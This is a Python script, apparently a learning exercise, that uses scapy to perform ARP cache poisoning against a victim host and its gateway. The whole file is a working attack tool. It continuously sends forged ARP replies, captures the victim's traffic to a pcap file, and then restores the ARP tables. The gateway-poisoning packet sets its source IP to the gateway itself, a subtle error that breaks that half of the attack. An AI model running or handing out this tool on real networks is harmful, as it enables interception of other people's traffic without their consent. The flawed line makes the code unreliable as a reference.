'''
arp attack test
'''
#*import os
import sys
import time
from multiprocessing import Process
from typing import Optional
from scapy.all import (
    conf,
    send,
    sniff,
    srp,
    wrpcap
)
from scapy.layers.l2 import ARP,Ether

def get_mac(targetip:str) -> Optional[str]:
    '''广播询问ip对应mac地址'''
    #! 创建查询数据包
    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op="who-has",pdst=targetip)
    resp , _ = srp(packet,timeout=2,retry=10,verbose=False)
    for _ , r in resp:
        return r["Ether"].src

class Arper(object):
    '''Arp attacker'''
    def __init__(self,victim:str,gateway:str,interface:str="wifi0") -> None:
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface =interface
        conf.verb = 0


        print(f"Initialized {interface}")
        print(f"Gateway ({gateway}) is at {self.gatewaymac}")
        print(f"Victim ({victim}) is at {self.victimmac}")
        print("-"*30)

    def run(self) -> None:
        '''入口'''
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()
        self.sniff_thred = Process(target=self.sniff)
        self.sniff_thred.start()

    def poison(self) -> None:
        '''投毒'''
        #! 构造搞受害者的数据包
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f"ip src  : {poison_victim.psrc}")
        print(f"ip dst  : {poison_victim.pdst}")
        print(f"mac dst : {poison_victim.hwdst}")
        print(f"mac_src : {poison_victim.hwsrc}")
        print(poison_victim.summary())
        print("-"*30)
        #! 构造搞网关的数据包
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.gateway
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac
        print(f"ip src  : {poison_gateway.psrc}")
        print(f"ip dst  : {poison_gateway.pdst}")
        print(f"mac dst : {poison_gateway.hwdst}")
        print(f"mac_src : {poison_gateway.hwsrc}")
        print(poison_gateway.summary())
        print("-"*30)
        print("Beginning the ARP poison.")
        #! 中毒持久化
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    def sniff(self,count:int=200) -> None:
        '''嗅探以记录攻击过程'''
        #! 延时启动五秒为投毒线程留下启动时间
        time.sleep(5)
        print(f"Sniffing {count} packets")
        bpf_filter = f"ip host {self.victim}"
        packets = sniff(count=count,filter=bpf_filter,iface=self.interface)
        wrpcap("arper.pcap",packets)
        print("Got the packets")
        self.restore()
        self.poison_thread.terminate()
        print("Finished")

    def restore(self) -> None:
        '''恢复现场'''
        print("Restoring APR tables ...")
        send(
            ARP(
                op=2,
                psrc=self.gateway,
                hwsrc=self.gatewaymac,
                pdst=self.victim,
                hwdst="ff:ff:ff:ff:ff:ff"
            ),
            count=5
        )
        send(
            ARP(
                op=2,
                psrc=self.victim,
                hwsrc=self.victimmac,
                pdst=self.gateway,
                hwdst="ff:ff:ff:ff:ff:ff"
            ),
            count=5
        )
        
def main():
    '''entrance'''
    if len(sys.argv) == 4:
        victim , gateway , interface = sys.argv[1] , sys.argv[2] , sys.argv[3]
        arp = Arper(victim,gateway,interface)
        arp.run()
    else:
        print("args victim gateway interface")

if __name__ == "__main__":
    main()
